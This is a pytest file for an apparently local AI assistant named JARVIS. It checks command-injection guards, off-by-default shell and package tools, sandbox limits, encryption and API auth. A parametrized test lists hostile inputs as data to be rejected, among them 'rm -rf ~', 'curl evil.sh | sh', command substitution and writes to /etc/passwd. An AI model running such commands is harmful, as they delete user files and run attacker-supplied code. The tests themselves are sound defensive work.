"""
tests/test_tools_security.py — Coverage for core/tools/* and the security
fixes: command-injection guards, opt-in gating of dangerous tools, and
encryption failing loudly instead of silently writing plaintext.

Run: pytest tests/test_tools_security.py -v
"""
import os
import sys
from unittest.mock import patch, MagicMock

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))


# ── system.py: safe-name validation ─────────────────────────────────────────

def test_validate_safe_name_accepts_normal_package():
    from core.tools.system import _validate_safe_name
    assert _validate_safe_name("vim") == "vim"
    assert _validate_safe_name("python3.11") == "python3.11"
    assert _validate_safe_name("lib32-glibc") == "lib32-glibc"


@pytest.mark.parametrize("payload", [
    "vim; rm -rf ~",
    "vim && curl evil.sh | sh",
    "vim `whoami`",
    "vim $(whoami)",
    "vim | tee /etc/passwd",
    "../../etc/passwd",
    "",
    "   ",
])
def test_validate_safe_name_rejects_injection_attempts(payload):
    from core.tools.system import _validate_safe_name
    assert _validate_safe_name(payload) is None


# ── system.py: dangerous tools are opt-in and off by default ───────────────

def test_install_package_disabled_by_default():
    from config import JarvisConfig, set_config
    from core.tools.system import install_package
    set_config(JarvisConfig())  # enable_package_management defaults to False
    result = install_package("vim")
    assert "disabled" in result.lower()


def test_shell_exec_disabled_by_default():
    from config import JarvisConfig, set_config
    from core.tools.system import shell_exec
    set_config(JarvisConfig())
    result = shell_exec("echo hi")
    assert "disabled" in result.lower()


def test_shell_exec_neutralizes_metacharacters_when_enabled():
    """Even with the feature enabled, `;`/`&&`/backticks must not be
    interpreted by a shell — they should be inert argv content."""
    from config import JarvisConfig, set_config
    from core.tools.system import shell_exec
    cfg = JarvisConfig()
    cfg.enable_shell_exec = True
    set_config(cfg)
    result = shell_exec("echo safe; echo INJECTED")
    # A real shell would run both echoes on separate lines; argv execution
    # should pass the whole string as literal arguments to `echo`.
    assert "INJECTED" not in result.split("\n")[-1] or "safe; echo INJECTED" in result
    set_config(JarvisConfig())  # reset for other tests


def test_install_package_rejects_malicious_name_even_when_enabled():
    from config import JarvisConfig, set_config
    from core.tools.system import install_package
    cfg = JarvisConfig()
    cfg.enable_package_management = True
    set_config(cfg)
    result = install_package("vim; rm -rf ~")
    assert "refused" in result.lower() or "invalid" in result.lower()
    set_config(JarvisConfig())


# ── code_interpreter.py ──────────────────────────────────────────────────────

def test_execute_python_basic():
    from core.tools.code_interpreter import execute_python
    assert execute_python("print(1 + 1)").strip() == "2"


def test_execute_python_blocks_known_dangerous_patterns():
    from core.tools.code_interpreter import execute_python
    result = execute_python("import os; os.system('echo hi')")
    assert "blocked" in result.lower()


def test_execute_python_enforces_timeout():
    from core.tools.code_interpreter import execute_python
    result = execute_python("import time; time.sleep(5)", timeout=1)
    assert "timed out" in result.lower()


def test_execute_python_enforces_memory_limit():
    from core.tools.code_interpreter import execute_python
    # Try to allocate far more than the default 256MB cap.
    result = execute_python("a = bytearray(2_000_000_000)")
    assert "memoryerror" in result.lower() or "memory" in result.lower()


# ── security.py: encryption fails loudly ────────────────────────────────────

def test_encrypt_json_file_raises_when_crypto_unavailable():
    from core.security import encrypt_json_file, EncryptionUnavailableError
    with patch("core.security.encrypt_text", return_value=None):
        with pytest.raises(EncryptionUnavailableError):
            encrypt_json_file("/tmp/does-not-matter.json", {"a": 1})


def test_encrypt_json_file_writes_enc_file_on_success(tmp_path):
    from core.security import encrypt_json_file, decrypt_json_file
    target = tmp_path / "mem.json"
    encrypt_json_file(str(target), {"hello": "world"}, key_file=str(tmp_path / ".key"))
    assert (tmp_path / "mem.json.enc").exists()
    assert not target.exists()  # no plaintext fallback file written
    data = decrypt_json_file(str(target), key_file=str(tmp_path / ".key"))
    assert data == {"hello": "world"}


# ── scraper.py (mocked network) ──────────────────────────────────────────────

def test_scrape_title_success():
    from core.tools.scraper import scrape_title
    fake_resp = MagicMock()
    fake_resp.text = "<html><head><title>Example</title></head></html>"
    fake_resp.raise_for_status = MagicMock()
    with patch("core.tools.scraper.requests.get", return_value=fake_resp):
        result = scrape_title("https://example.com")
    assert "Example" in result


def test_scrape_title_timeout():
    import requests
    from core.tools.scraper import scrape_title
    with patch("core.tools.scraper.requests.get", side_effect=requests.exceptions.Timeout):
        result = scrape_title("https://example.com")
    assert "❌" in result


# ── git_tool.py (mocked subprocess, no shell=True anywhere) ────────────────

def test_git_status_uses_argv_not_shell():
    from core.tools.git_tool import git_command
    with patch("core.tools.git_tool.shutil.which", return_value="/usr/bin/git"):
        with patch("core.tools.git_tool.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(stdout="clean", stderr="", returncode=0)
            git_command(["status"])
            args, kwargs = mock_run.call_args
            assert kwargs.get("shell", False) is False
            assert isinstance(args[0], list)


# ── REST API: auth + per-client rate limiting ───────────────────────────────

def test_api_key_auth_roundtrip():
    fastapi_testclient = pytest.importorskip("fastapi.testclient")
    from config import JarvisConfig, set_config
    cfg = JarvisConfig()
    cfg.api_key = "secret123"
    set_config(cfg)
    from api.rest_api import create_app
    client = fastapi_testclient.TestClient(create_app())

    assert client.get("/status").status_code == 401
    assert client.get("/status", headers={"X-API-Key": "wrong"}).status_code == 401
    assert client.get("/status", headers={"X-API-Key": "secret123"}).status_code == 200
    set_config(JarvisConfig())


def test_rate_limiter_registry_isolates_clients():
    from core.security import RateLimiterRegistry
    reg = RateLimiterRegistry(max_requests=2, window_seconds=60)
    assert reg.allow("client-a") is True
    assert reg.allow("client-a") is True
    assert reg.allow("client-a") is False  # client-a exhausted its budget
    assert reg.allow("client-b") is True   # client-b is unaffected


# ── Native tool-calling round trip (core/llm.py + core/tools/registry.py) ──

def test_tool_registry_excludes_dangerous_ops():
    """install_package/remove_package/shell_exec must never be reachable
    as auto-invocable LLM tools, regardless of config."""
    from config import JarvisConfig
    from core.tools.registry import get_dispatch_map
    cfg = JarvisConfig()
    cfg.enable_package_management = True
    cfg.enable_shell_exec = True
    names = set(get_dispatch_map(cfg).keys())
    assert "install_package" not in names
    assert "remove_package" not in names
    assert "shell_exec" not in names


def test_stream_llm_executes_tool_call_round_trip():
    """End-to-end: model requests a tool call, JARVIS executes it and
    feeds the result back, model streams a final answer."""
    import json
    import threading
    import time
    from http.server import BaseHTTPRequestHandler, HTTPServer

    calls = {"n": 0}

    class Handler(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_POST(self):
            length = int(self.headers.get("Content-Length", 0))
            body = json.loads(self.rfile.read(length))
            calls["n"] += 1
            self.send_response(200)
            self.send_header("Content-Type", "application/x-ndjson")
            self.end_headers()
            if calls["n"] == 1:
                assert "tools" in body
                chunk = {
                    "message": {"role": "assistant", "content": "",
                                "tool_calls": [{"function": {"name": "calculate",
                                                              "arguments": {"expression": "6*7"}}}]},
                    "done": True,
                }
                self.wfile.write((json.dumps(chunk) + "\n").encode())
            else:
                tool_msgs = [m for m in body["messages"] if m.get("role") == "tool"]
                assert tool_msgs and "42" in tool_msgs[0]["content"]
                for word in ["The ", "answer ", "is ", "42."]:
                    self.wfile.write((json.dumps({"message": {"content": word}, "done": False}) + "\n").encode())
                self.wfile.write((json.dumps({"message": {"content": ""}, "done": True}) + "\n").encode())

    server = HTTPServer(("127.0.0.1", 0), Handler)
    port = server.server_address[1]
    threading.Thread(target=server.serve_forever, daemon=True).start()
    try:
        from config import JarvisConfig, set_config
        cfg = JarvisConfig()
        cfg.ollama_url = f"http://127.0.0.1:{port}/api/chat"
        cfg.use_native_tool_calling = True
        cfg.memory_file = "/tmp/test_tool_roundtrip_memory.json"
        set_config(cfg)

        from core.llm import stream_llm
        out = "".join(chunk for chunk, _ in stream_llm("what is 6*7?"))
        assert out == "The answer is 42."
        assert calls["n"] == 2
    finally:
        server.shutdown()
        set_config(JarvisConfig())
